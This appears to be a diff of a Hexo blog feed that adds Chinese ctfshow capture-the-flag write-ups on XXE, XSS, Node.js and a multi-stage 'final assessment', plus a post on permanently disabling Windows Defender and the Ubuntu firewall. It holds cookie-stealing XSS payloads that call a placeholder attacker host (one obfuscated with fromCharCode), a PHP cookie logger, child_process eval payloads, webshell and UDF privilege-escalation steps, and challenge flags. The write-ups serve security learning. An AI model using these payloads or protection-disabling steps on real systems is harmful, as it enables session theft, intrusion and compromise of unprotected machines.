+        <content type="html"><![CDATA[<h2 id="ssti浅叙"><a href="#ssti浅叙" class="headerlink" title="ssti浅叙"></a>ssti浅叙</h2><p>  <a href="https://www.anquanke.com/post/id/188172#h2-11">https://www.anquanke.com/post/id/188172#h2-11</a></p><p><a href="https://blog.csdn.net/weixin_45669205/article/details/114373785?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163757565916780271539127%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=163757565916780271539127&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-114373785.pc_search_result_cache&amp;utm_term=ctfshow+ssti&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/weixin_45669205/article/details/114373785?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163757565916780271539127%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=163757565916780271539127&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-114373785.pc_search_result_cache&amp;utm_term=ctfshow+ssti&amp;spm=1018.2226.3001.4187</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctfshow </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ssti </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>xxe</title>
+      <link href="/2022/01/22/ctfshow-xxe/"/>
+      <url>/2022/01/22/ctfshow-xxe/</url>
+      
+        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="https://xz.aliyun.com/t/3357#toc-2">一篇文章带你深入理解漏洞之XXE</a></p><p><a href="https://blog.csdn.net/weixin_45669205/article/details/115091314">XML基础知识</a></p><h2 id="373"><a href="#373" class="headerlink" title="373"></a>373</h2><p>很明显可以实体注入，而且是有回显的，所以要注意的是 <code>echo $creds-&gt;ctfshow</code>是<code>echo</code>出<code>ctfshow</code>这个元素，因此一定要用它来包裹实体<br>]&gt;<br><note><br>     <ctfshow><br>         &amp;test;<br>     </ctfshow><br></note></p><p><img src="/2022/01/22/ctfshow-xxe/image-20211127213543086.png" alt="image-20211127213543086"></p><p>提示 :  抓包的请求头 Connection 要删除 或者 keep-alive<img src="C:\Users\86181\AppData\Roaming\Typora\typora-user-images\image-20211127214008110.png" alt="image-20211127214008110"></p><p>xml文档区分大小写 以及变量别忘记加分号；</p><h2 id="374"><a href="#374" class="headerlink" title="374"></a>374</h2>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctfshow </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> xxe </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>xss</title>
+      <link href="/2022/01/22/ctfshow-xss/"/>
+      <url>/2022/01/22/ctfshow-xss/</url>
+      
+        <content type="html"><![CDATA[<p>[TOC]</p><p>在自己的vps上搞</p><p>集成环境 安装小皮面板或者宝塔面板</p><h2 id="316"><a href="#316" class="headerlink" title="316"></a>316<img src="/2022/01/22/ctfshow-xss/image-20211120200251538.png" alt="image-20211120200251538"></h2><p>payload:</p><script>window.location.href='http://xxx/1.php?1='+document.cookie;</script><h2 id="317"><a href="#317" class="headerlink" title="317"></a>317</h2> <h2 id="318"><a href="#318" class="headerlink" title="318"></a>318</h2> <h2 id="319"><a href="#319" class="headerlink" title="319"></a>319</h2><p>317-319  分别过滤了 script img 等  上面payload通杀</p><h2 id="320"><a href="#320" class="headerlink" title="320"></a>320</h2><p>过滤了空格</p><p>&lt;body/**/onload=”window.location.href=’<a href="http://xxx/1.php?1='+document.cookie&quot;>">http://xxx/1.php?1='+document.cookie"&gt;</a></p><h2 id="321"><a href="#321" class="headerlink" title="321"></a>321</h2><p>用‘/’ 或者‘/**/’代替空格</p><h2 id="322"><a href="#322" class="headerlink" title="322"></a>322</h2><p>继续通杀</p><h2 id="323-326"><a href="#323-326" class="headerlink" title="323-326"></a>323-326</h2><p>通杀！！！</p><h2 id="327"><a href="#327" class="headerlink" title="327"></a>327</h2><p>我们要拿到管理员的cookie 收件人要是admin </p><p>&lt;body/**/onload=”window.location.href=’<a href="http://xxx/1.php?1='+document.cookie&quot;>">http://xxx/1.php?1='+document.cookie"&gt;</a> 不行 </p><p>返璞归真</p><script>window.location.href='http://xss/1.php?1='+document.cookie;</script><h2 id="328"><a href="#328" class="headerlink" title="328"></a>328</h2><p>要管理员才能查看用户账号密码，我们可以在注册的时候写入xss 等管理员访问的时候拿到管理员cookie</p><p>抓包伪造管理员的cookie</p><p><img src="/2022/01/22/ctfshow-xss/image-20211120214800843.png" alt="image-20211120214800843"></p><h2 id="329"><a href="#329" class="headerlink" title="329"></a>329</h2><p>cookie发送给攻击者之前就失效了，盗用cookie不行，那就直接获取管理员页面的东东</p><script>window.open('http://xxx/1.php?1='+document.getElementsByClassName('layui-table-cell laytable-cell-1-0-1')[1].innerHTML)</script><h2 id="330"><a href="#330" class="headerlink" title="330"></a>330</h2><p>发现多了一个修改密码页面，抓包 发现有api接口</p><p>让管理员本机127.0.0.1修改密码</p><script>window.location.href='http://127.0.0.1/api/change.php?p=1234'</script><p>然后管理员登录得到flag</p><h2 id="331"><a href="#331" class="headerlink" title="331"></a>331</h2><p>post方式修改密码 发现.ajax</p><script>$.ajax({url:'api/change.php',type:'post',data:{p:'123'}});</script><h2 id="332"><a href="#332" class="headerlink" title="332"></a>332</h2><p>让收款人转账为负数，自己就无数的钱了</p><h2 id="333"><a href="#333" class="headerlink" title="333"></a>333</h2><p>非预期解：自己给自己转账 加倍增长，预测15此转即可</p><p>预期解:</p><p>先给自己转1元 抓包看参数。</p><p>然后让管理员转钱</p><script>$.ajax({url:'api/amount.php',type:'post',data:{u:'123',a:'16116'}});</script>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctfshow </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> xss </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>node.js</title>
+      <link href="/2022/01/22/ctfshow-node.js/"/>
+      <url>/2022/01/22/ctfshow-node.js/</url>
+      
+        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="334"><a href="#334" class="headerlink" title="334"></a>334</h2><p>use.js 有用户名和密码,但login.js发现</p><p><img src="/2022/01/22/ctfshow-node.js/image-20211125194424142.png" alt="image-20211125194424142"></p><p>通过分析逻辑可以知道username=ctfshow 就可以了</p><h2 id="335"><a href="#335" class="headerlink" title="335"></a>335</h2><p>通过查看源代码的到提示eval 推测是命令执行 child_process模块</p><p>payload:   ?eval=require(“child_process”).execSync(“ls”)</p><h2 id="336"><a href="#336" class="headerlink" title="336"></a>336</h2><p>方法一：payload: ?eval=require(“child_process”).spawnSync(“ls”).stdout.toString() 但是不知道为什么cat flag那搞不出</p><p>方法二：?eval=require(‘child_process’)[‘exe’%2B’cSync’](‘cat fl001g.txt’)</p><p>方法三：?eval=__filename 获取当前模块文件被解析后的绝对路径.再?eval=require(“fs”).readFileSync(“路径”)就可以查看被过滤了’exec’还有’load’。</p><p> 其实也可以直接 ?eval=require(“fs”).readFileSync(‘fl001g.txt’) 得到flag</p><h2 id="337"><a href="#337" class="headerlink" title="337"></a>337</h2><p>md5强类型 数组可以绕过</p><p>?a[]=1&amp;&amp;b[]=1</p><h2 id="338"><a href="#338" class="headerlink" title="338"></a>338</h2><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x03"> JavaScript Prototype 污染攻击</a></p><p>每个对象都有一个__proto__指向它的构造函数的原型对象(prototype)</p><pre class="line-numbers language-none"><code class="language-none">foo.__proto__ == Foo.prototype<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/01/22/ctfshow-node.js/image-20211127102216576.png" alt="image-20211127102216576"></p><p>条件是：<code>secert.ctfshow==='36dboy'</code>，但utils.copy函数是关键：它会将<code>object1[key] = object2[key]</code>从而实现原型链的污染</p><p><img src="/2022/01/22/ctfshow-node.js/image-20211127102332550.png" alt="image-20211127102332550"></p><p><img src="/2022/01/22/ctfshow-node.js/image-20211127102150846.png" alt="image-20211127102150846"></p><h2 id="339"><a href="#339" class="headerlink" title="339"></a>339</h2>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctfshow </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> node.js </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>关闭Windows Defender实时保护，暂时关闭和永久关闭方法.md</title>
+      <link href="/2022/01/22/guan-bi-windows-defender-shi-shi-bao-hu-zan-shi-guan-bi-he-yong-jiu-guan-bi-fang-fa-md/"/>
+      <url>/2022/01/22/guan-bi-windows-defender-shi-shi-bao-hu-zan-shi-guan-bi-he-yong-jiu-guan-bi-fang-fa-md/</url>
+      
+        <content type="html"><![CDATA[<h2 id="关闭Windows-Defender实时保护，暂时关闭和永久关闭方法"><a href="#关闭Windows-Defender实时保护，暂时关闭和永久关闭方法" class="headerlink" title="关闭Windows Defender实时保护，暂时关闭和永久关闭方法"></a>关闭Windows Defender实时保护，暂时关闭和永久关闭方法</h2><p>暂时关闭Windows Defender实时保护<br>点击开始→设置→更新和安全→Windows安全中心，打开Windows安全中心；<br>点击主页→病毒和威胁防护或管理设置，关闭实时保护。<br>这样就暂时关闭了实时保护，就算不重启也可能某个时候又自动打开了实时保护。</p><p>永久关闭实时保护<br>Win+r 输入regedit启动注册表编辑器；<br>定位到以下路径计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center\Feature，然后在右侧栏空白处右击鼠标，新建一个DWORD(32)值，重命名为DisableAvCheck并赋值为1；<br>继续在计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender下新建DWORD(32)值，并重命名为DisableAntiSpyware，并赋值为1；<br>最后我们重新启动电脑。<br>这时Windows Defender便被彻底关闭掉了，win10的实时保护功能也禁止了，停止了自动运行，系统速度终于恢复正常。</p><p>计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection</p><p>把DisableRealtimeMonitoring从0改为1 </p><h2 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h2><p>买了腾讯云服务器 防火墙问题之类的</p><p>1.关闭ubuntu的防火墙 ufw disable<br>2.卸载了iptables         apt-get remove iptables</p><p>1.用iptables -F这个命令来关闭防火墙,但是使用这个命令前,千万记得用iptables -L查看一下你的系统中所有链的默认target,iptables -F这个命令只是清除所有规则,只不会真正关闭iptables.想象一下,如果你的链默认target是DROP,本来你有规则来允许一些特定的端口, 但一旦应用iptables -L ,清除了所有规则以后,默认的target就会阻止任何访问,当然包括远程ssh管理服务器的你.</p><p>　　所以我建议的关闭防火墙命令是 </p><p>　　iptables -P INPUT ACCEPT </p><p>　　iptables -P FORWARD ACCEPT </p><p>　　iptables -P OUTPUT ACCEPT </p><p>　　iptables -F </p><p>　 　总之,当你要在你的服务器上做任何变更时,最好有一个测试环境做过充分的测试再应用到你的服务器.除此之外,要用好iptables,那就要理解 iptables的运行原理,知道对于每一个数据包iptables是怎么样来处理的.这样才能准确地书写规则,避免带来不必要的麻烦.</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 关防护 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ubantu防火墙 出网之类的问题 </tag>
+            
+            <tag> windows自带杀马 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>typora-vue-theme主题介绍</title>
       <link href="/2022/01/21/test/"/>
       <url>/2022/01/21/test/</url>
@@ -32,25 +359,24 @@
     
     <entry>
       <title>终极考核</title>
-      <link href="/2022/01/20/zhong-ji-kao-he/"/>
-      <url>/2022/01/20/zhong-ji-kao-he/</url>
+      <link href="/2022/01/20/ctfshow-zhong-ji-kao-he/"/>
+      <url>/2022/01/20/ctfshow-zhong-ji-kao-he/</url>
       
-        <content type="html"><![CDATA[<p>[TOC]</p><p>注：  目录序号 是我做题得到的答案序号</p><h2 id="640"><a href="#640" class="headerlink" title="640"></a>640</h2><pre class="line-numbers language-none"><code class="language-none">flag_640=ctfshow{060ae7a27d203604baeb125f939570ef}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="641"><a href="#641" class="headerlink" title="641"></a>641</h2><p>F12 network查看请求头</p><p>flag_641=ctfshow{affac61c787a82cc396585bea8ecf2dc}</p><h2 id="642"><a href="#642" class="headerlink" title="642"></a>642</h2><p><img src="/2022/01/20/zhong-ji-kao-he/image-20211209203650604.png" alt="image-20211209203650604"></p><p>system36d 好奇怪  输入  然后发现会自动跳转  那我抓包看看<img src="/2022/01/20/zhong-ji-kao-he/image-20211209203732621.png" alt="image-20211209203732621"></p><h2 id="644"><a href="#644" class="headerlink" title="644"></a>644</h2><p>发现第二个是有x   猜测是0x然后36d  果不其然对了。。。</p><p><img src="/2022/01/20/zhong-ji-kao-he/image-20211209233233540.png" alt="image-20211209233233540"></p><h2 id="645"><a href="#645" class="headerlink" title="645"></a>645</h2><p>flag_645=ctfshow{28b00f799c2e059bafaa1d6bda138d89}</p><p>数据备份中</p><p><img src="/2022/01/20/zhong-ji-kao-he/image-20211210210217403.png" alt="image-20211210210217403"></p><h2 id="643"><a href="#643" class="headerlink" title="643"></a>643</h2><p>ping 命令模块 抓包  输入命令 ls  发现secret.txt文件  然后进入url解码</p><p><img src="/2022/01/20/zhong-ji-kao-he/image-20211210213332983.png" alt="image-20211210213332983"></p><h2 id="647"><a href="#647" class="headerlink" title="647"></a>647</h2><p> !==逻辑    striopos传数组会返回null    因此只需要找到无参数的返回数组的函数</p><p>flag_647=ctfshow{e6ad8304cdb562971999b476d8922219}</p><p><img src="/2022/01/20/zhong-ji-kao-he/image-20211212193212450.png" alt="image-20211212193212450"></p><h2 id="648"><a href="#648" class="headerlink" title="648"></a>648</h2><p><img src="/2022/01/20/zhong-ji-kao-he/image-20211212200922362.png" alt="image-20211212200922362"></p><p>flag_648=ctfshow{af5b5e411813eafd8dc2311df30b394e}</p><h2 id="649"><a href="#649" class="headerlink" title="649"></a>649</h2><p>flag_649=ctfshow{9ad80fcc305b58afbb3a0c2097ac40ef}</p><p><img src="/2022/01/20/zhong-ji-kao-he/image-20211212205930462.png" alt="image-20211212205930462"></p><h2 id="650"><a href="#650" class="headerlink" title="650"></a>650</h2><p><img src="/2022/01/20/zhong-ji-kao-he/image-20211212210146509.png" alt="image-20211212210146509"></p><p>flag_650=ctfshow{5eae22d9973a16a0d37c9854504b3029}</p><h2 id="651"><a href="#651" class="headerlink" title="651"></a>651</h2><p><img src="/2022/01/20/zhong-ji-kao-he/image-20211213204319922.png" alt="image-20211213204319922"></p><p><img src="/2022/01/20/zhong-ji-kao-he/image-20211213204301114.png" alt="image-20211213204301114"></p><p>flag_651=ctfshow{a4c64b86d754b3b132a138e3e0adcaa6}</p><h2 id="652"><a href="#652" class="headerlink" title="652"></a>652</h2><p>查看 util/common.php </p><p><img src="/2022/01/20/zhong-ji-kao-he/image-20211216195339944.png" alt="image-20211216195339944"></p><p>发现文件包含漏洞 一开始发现有新增用户功能可以写入数据库  写入恶意马进去</p><!--?php                                                        ?--><p>“);?&gt;</p><p>查看dbutil.php</p><p>发现文件包含漏洞 一开始发现有新增用户功能可以写入数据库  写入恶意马进去</p><!--?php                                                        ?--><p>“);?&gt;</p><p>查看dbutil.php</p><p><img src="/2022/01/20/zhong-ji-kao-he/image-20211216210036652.png" alt="image-20211216210036652"></p><p>想办法得到key</p><p>然后发现page.php可以sql注入;</p><p><img src="/2022/01/20/zhong-ji-kao-he/image-20211216210928095.png" alt="image-20211216210928095"></p><p>发现key=key_is_here_you_know</p><p><img src="/2022/01/20/zhong-ji-kao-he/image-20211216195634626.png" alt="image-20211216195634626"></p><p>然后蚁剑连shell.php</p><p><img src="/2022/01/20/zhong-ji-kao-he/image-20211216213043468.png" alt="image-20211216213043468"></p><p><img src="/2022/01/20/zhong-ji-kao-he/image-20211218121908857.png" alt="image-20211218121908857"></p><p>啊咧 啥都不能看  查看题目的phpinfo disable_functions还有<img src="C:\Users\86181\AppData\Roaming\Typora\typora-user-images\image-20211218122319071.png" alt="image-20211218122319071"></p><p>明白原因  因题目还有数据库 可以用蚁剑看看数据库</p><p><img src="/2022/01/20/zhong-ji-kao-he/image-20211216213226631.png" alt="image-20211216213226631"></p><p>flag_652=ctfshow{4b37ab4b6504d43ea0de9a688f0e3ffa}</p><h2 id="653"><a href="#653" class="headerlink" title="653"></a>653</h2><p><img src="/2022/01/20/zhong-ji-kao-he/image-20211218122840454.png" alt="image-20211218122840454"></p><p>flag_653=ctfshow{5526710eb3ed7b4742232d6d6f9ee3a9}</p><h2 id="654"><a href="#654" class="headerlink" title="654"></a>654</h2><p>ls 发现有个root目录  就想到要提权 </p><p>udf 提权步骤  （前提是确认要 secure_file_priv 没有限制）</p><p>1.寻找插件目录</p><p>2.写入动态链接库</p><p>3.创建自定义函数</p><p><img src="/2022/01/20/zhong-ji-kao-he/image-20211219195859196.png" alt="image-20211219195859196"></p><p>不要忘记 base64解码后 再放进去 udf.so 文件中</p><p><img src="C:\Users\86181\AppData\Roaming\Typora\typora-user-images\image-20211219195946821.png" alt="image-20211219195946821"></p><p><img src="C:\Users\86181\AppData\Roaming\Typora\typora-user-images\image-20211219200044995.png" alt="image-20211219200044995"></p><p>赋予最高权限</p><p>再然后到数据库中 执行自定义函数  别忘记加sudo命令</p><p><img src="/2022/01/20/zhong-ji-kao-he/image-20211219200143737.png" alt="image-20211219200143737"></p><p>flag_654=ctfshow{4ab2c2ccd0c3c35fdba418d8502f5da9} </p><h2 id="655"><a href="#655" class="headerlink" title="655"></a>655</h2><p>先扫描存活的主机和端口，得先知道主机上有什么服务，好开启下一步。</p><p>ifconfig 知道当前内网ip </p><p>ping 获取存活的主机</p><p>curl 请求 Web 服务器 知道了phpinfo.php 还有<a href="http://www.zip等等/">www.zip等等</a></p><p>flag_655=ctfshow{aada21bce99ddeab20020ac714686303}</p><h2 id="656"><a href="#656" class="headerlink" title="656"></a>656</h2><p>解压<a href="http://www.zip/">www.zip</a> 题目提示xss</p><p><img src="/2022/01/20/zhong-ji-kao-he/image-20220112211537045.png" alt="image-20220112211537045"></p><p>发现可以xff注入恶意脚本获取管理员cookie</p><p>在内网上搭建1.php</p><!--?php \$content=\$_GET['1']; file_put_contents("log.txt",\$content);?--><p>在终端中输入  curl -H ‘X-Forwarded-For:</p><p>window.location.href=String.fromCharCode(104,116,116,112,58,47,47,49,55,50,46,50,46,50,48,50,46,52,47,49,46,112,104,112,63,49,61)+document.cookie;<a href="http://172.2.202.5/index.php?action=login&amp;u=55&amp;p=66">http://172.2.202.5/index.php?action=login&amp;u=55&amp;p=66</a></p><p>注:  单引号！！！ </p><p><img src="/2022/01/20/zhong-ji-kao-he/image-20220112213815185.png" alt="image-20220112213815185"></p><p>flag_656=ctfshow{e0b80d6b99d2bdbae36f121f78abe96b}</p><h2 id="657"><a href="#657" class="headerlink" title="657"></a>657</h2><p><img src="/2022/01/20/zhong-ji-kao-he/image-20220113140742418.png" alt="image-20220113140742418"></p><p>flag_657=ctfshow{2a73f8f87a58a13c23818fafd83510b1}</p>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>Hello World</title>
-      <link href="/2022/01/20/hello-world/"/>
-      <url>/2022/01/20/hello-world/</url>
-      
-        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
+        <content type="html"><![CDATA[<p>[TOC]</p><p>注：  目录序号 是我做题得到的答案序号</p><h2 id="640"><a href="#640" class="headerlink" title="640"></a>640</h2><pre class="line-numbers language-none"><code class="language-none">flag_640=ctfshow{060ae7a27d203604baeb125f939570ef}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="641"><a href="#641" class="headerlink" title="641"></a>641</h2><p>F12 network查看请求头</p><p>flag_641=ctfshow{affac61c787a82cc396585bea8ecf2dc}</p><h2 id="642"><a href="#642" class="headerlink" title="642"></a>642</h2><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211209203650604.png" alt="image-20211209203650604"></p><p>system36d 好奇怪  输入  然后发现会自动跳转  那我抓包看看<img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211209203732621.png" alt="image-20211209203732621"></p><h2 id="644"><a href="#644" class="headerlink" title="644"></a>644</h2><p>发现第二个是有x   猜测是0x然后36d  果不其然对了。。。</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211209233233540.png" alt="image-20211209233233540"></p><h2 id="645"><a href="#645" class="headerlink" title="645"></a>645</h2><p>flag_645=ctfshow{28b00f799c2e059bafaa1d6bda138d89}</p><p>数据备份中</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211210210217403.png" alt="image-20211210210217403"></p><h2 id="643"><a href="#643" class="headerlink" title="643"></a>643</h2><p>ping 命令模块 抓包  输入命令 ls  发现secret.txt文件  然后进入url解码</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211210213332983.png" alt="image-20211210213332983"></p><h2 id="647"><a href="#647" class="headerlink" title="647"></a>647</h2><p> !==逻辑    striopos传数组会返回null    因此只需要找到无参数的返回数组的函数</p><p>flag_647=ctfshow{e6ad8304cdb562971999b476d8922219}</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211212193212450.png" alt="image-20211212193212450"></p><h2 id="648"><a href="#648" class="headerlink" title="648"></a>648</h2><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211212200922362.png" alt="image-20211212200922362"></p><p>flag_648=ctfshow{af5b5e411813eafd8dc2311df30b394e}</p><h2 id="649"><a href="#649" class="headerlink" title="649"></a>649</h2><p>flag_649=ctfshow{9ad80fcc305b58afbb3a0c2097ac40ef}</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211212205930462.png" alt="image-20211212205930462"></p><h2 id="650"><a href="#650" class="headerlink" title="650"></a>650</h2><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211212210146509.png" alt="image-20211212210146509"></p><p>flag_650=ctfshow{5eae22d9973a16a0d37c9854504b3029}</p><h2 id="651"><a href="#651" class="headerlink" title="651"></a>651</h2><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211213204319922.png" alt="image-20211213204319922"></p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211213204301114.png" alt="image-20211213204301114"></p><p>flag_651=ctfshow{a4c64b86d754b3b132a138e3e0adcaa6}</p><h2 id="652"><a href="#652" class="headerlink" title="652"></a>652</h2><p>查看 util/common.php </p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211216195339944.png" alt="image-20211216195339944"></p><p>发现文件包含漏洞 一开始发现有新增用户功能可以写入数据库  写入恶意马进去</p><!--?php                                                        ?--><p>“);?&gt;</p><p>查看dbutil.php</p><p>发现文件包含漏洞 一开始发现有新增用户功能可以写入数据库  写入恶意马进去</p><!--?php                                                        ?--><p>“);?&gt;</p><p>查看dbutil.php</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211216210036652.png" alt="image-20211216210036652"></p><p>想办法得到key</p><p>然后发现page.php可以sql注入;</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211216210928095.png" alt="image-20211216210928095"></p><p>发现key=key_is_here_you_know</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211216195634626.png" alt="image-20211216195634626"></p><p>然后蚁剑连shell.php</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211216213043468.png" alt="image-20211216213043468"></p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211218121908857.png" alt="image-20211218121908857"></p><p>啊咧 啥都不能看  查看题目的phpinfo disable_functions还有<img src="C:\Users\86181\AppData\Roaming\Typora\typora-user-images\image-20211218122319071.png" alt="image-20211218122319071"></p><p>明白原因  因题目还有数据库 可以用蚁剑看看数据库</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211216213226631.png" alt="image-20211216213226631"></p><p>flag_652=ctfshow{4b37ab4b6504d43ea0de9a688f0e3ffa}</p><h2 id="653"><a href="#653" class="headerlink" title="653"></a>653</h2><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211218122840454.png" alt="image-20211218122840454"></p><p>flag_653=ctfshow{5526710eb3ed7b4742232d6d6f9ee3a9}</p><h2 id="654"><a href="#654" class="headerlink" title="654"></a>654</h2><p>ls 发现有个root目录  就想到要提权 </p><p>udf 提权步骤  （前提是确认要 secure_file_priv 没有限制）</p><p>1.寻找插件目录</p><p>2.写入动态链接库</p><p>3.创建自定义函数</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211219195859196.png" alt="image-20211219195859196"></p><p>不要忘记 base64解码后 再放进去 udf.so 文件中</p><p><img src="C:\Users\86181\AppData\Roaming\Typora\typora-user-images\image-20211219195946821.png" alt="image-20211219195946821"></p><p><img src="C:\Users\86181\AppData\Roaming\Typora\typora-user-images\image-20211219200044995.png" alt="image-20211219200044995"></p><p>赋予最高权限</p><p>再然后到数据库中 执行自定义函数  别忘记加sudo命令</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211219200143737.png" alt="image-20211219200143737"></p><p>flag_654=ctfshow{4ab2c2ccd0c3c35fdba418d8502f5da9} </p><h2 id="655"><a href="#655" class="headerlink" title="655"></a>655</h2><p>先扫描存活的主机和端口，得先知道主机上有什么服务，好开启下一步。</p><p>ifconfig 知道当前内网ip </p><p>ping 获取存活的主机</p><p>curl 请求 Web 服务器 知道了phpinfo.php 还有<a href="http://www.zip等等/">www.zip等等</a></p><p>flag_655=ctfshow{aada21bce99ddeab20020ac714686303}</p><h2 id="656"><a href="#656" class="headerlink" title="656"></a>656</h2><p>解压<a href="http://www.zip/">www.zip</a> 题目提示xss</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220112211537045.png" alt="image-20220112211537045"></p><p>发现可以xff注入恶意脚本获取管理员cookie</p><p>在内网上搭建1.php</p><!--?php \$content=\$_GET['1']; file_put_contents("log.txt",\$content);?--><p>在终端中输入  curl -H ‘X-Forwarded-For:</p><p>window.location.href=String.fromCharCode(104,116,116,112,58,47,47,49,55,50,46,50,46,50,48,50,46,52,47,49,46,112,104,112,63,49,61)+document.cookie;<a href="http://172.2.202.5/index.php?action=login&amp;u=55&amp;p=66">http://172.2.202.5/index.php?action=login&amp;u=55&amp;p=66</a></p><p>注:  单引号！！！ </p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220112213815185.png" alt="image-20220112213815185"></p><p>flag_656=ctfshow{e0b80d6b99d2bdbae36f121f78abe96b}</p><h2 id="657"><a href="#657" class="headerlink" title="657"></a>657</h2><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220113140742418.png" alt="image-20220113140742418"></p><p>flag_657=ctfshow{2a73f8f87a58a13c23818fafd83510b1}</p>]]></content>
       
       
+      <categories>
+          
+          <category> ctfshow </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 终极考核 </tag>
+            
+        </tags>
       
     </entry>
     
